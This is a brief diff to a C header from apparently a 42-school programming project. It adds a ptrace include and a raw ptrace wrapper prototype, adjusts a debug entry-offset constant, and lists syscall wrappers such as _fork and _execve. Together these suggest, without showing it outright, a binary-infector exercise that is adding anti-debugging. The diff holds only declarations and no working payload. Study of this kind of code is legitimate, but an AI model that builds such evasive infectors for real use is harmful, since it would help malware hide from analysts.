@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 14:56:45 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/09 21:50:14 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -24,7 +24,7 @@
 # include <sys/mman.h>
 # include <stdlib.h>
 # include <limits.h>
-
+# include <sys/ptrace.h>
 /* Enum */
 
 /* Define */
@@ -44,7 +44,7 @@
 # define PROG_INFO	512
 
 # ifdef DEBUG
-#  define ENTRY_OFF	2331
+#  define ENTRY_OFF	2392
 # else
 #  define ENTRY_OFF 2183
 # endif
@@ -155,7 +155,7 @@ void			*_memset(void *b, int c, size_t len);
 int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
 bool			check_name(char *str, int len);
-
+int				_ptrace(long request, long pid ,unsigned long addr, unsigned long data);
 void			_log(char *msg, size_t size);
 pid_t			_fork(void);
 int				_execve(const char *filename, char *const argv[], char *const envp[]);
